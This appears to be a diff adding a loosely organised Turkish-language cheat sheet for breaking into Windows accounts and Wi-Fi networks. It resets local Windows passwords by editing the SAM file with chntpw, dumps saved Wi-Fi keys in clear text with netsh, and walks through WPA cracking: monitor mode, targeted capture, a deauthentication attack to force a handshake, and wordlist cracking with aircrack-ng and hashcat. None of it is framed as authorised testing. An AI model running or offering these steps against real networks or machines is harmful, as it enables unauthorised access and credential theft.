@@ -1,0 +1,61 @@
+# MSYS2 kurulduktan sonra paketleri güncelleyin
+pacman -Syu
+
+# Gerekli temel araçları yükleyin
+pacman -S git wget curl vim nano
+. Windows Parola Kırma / Sıfırlama Araçları
+A) Offline NT Password Editor (chntpw)
+Bu araç, SAM dosyasını düzenleyerek yerel Windows parolalarını sıfırlar. MSYS2'de derlenebilir.
+git clone https://github.com/jendralhxr/ntpasswd
+cd ntpasswd
+# Derleme talimatlarını takip edin (genelde Linux'ta çalışır, MSYS2 ile uyumlu değilse WSL önerilir)
+
+#!/bin/bash
+# Hiren's BootCD PE USB oluşturma
+wget https://www.hirensbootcd.org/files/HBCD_PE_x64.iso
+# Rufus veya dd ile USB'ye yazma (Rufus Windows'ta GUI gerektirir)
+
+# Tüm kayıtlı ağları listele
+netsh wlan show profiles
+
+# Belirli bir ağın parolasını göster
+netsh wlan show profile name="AĞ_ADI" key=clear
+
+cmd /c "netsh wlan show profile name='AĞ_ADI' key=clear"
+
+pacman -S aircrack-ng
+Wifi kartı mönitör moda geçir
+airmon-ng start wlan0
+
+airodump-ng wlan0mon
+
+airodump-ng -c 1 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
+
+<h1>YADA</h1>
+
+Monitor moduna geç - airmon-ng start wlan0
+
+Ağları tara - airodump-ng wlan0mon
+
+Hedef ağa yönel - airodump-ng -c 1 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
+
+4-way handshake yakala (bir istemci bağlanırken/bağlantı kesilirken)
+
+Deauth saldırısı ile zorla yeniden bağlan - aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
+
+Hash kır - aircrack-ng -w wordlist.txt capture-01.cap
+
+B) Hashcat ile Hızlandırılmış Kırma
+CAP dosyasını hashcat formatına dönüştür:
+# cap → hccapx dönüşümü
+cap2hccapx capture-01.cap capture-01.hccapx
+
+# Hashcat ile kır (GPU kullanır)
+hashcat -m 2500 capture-01.hccapx wordlist.txt
+
+
+
+
+
+
+
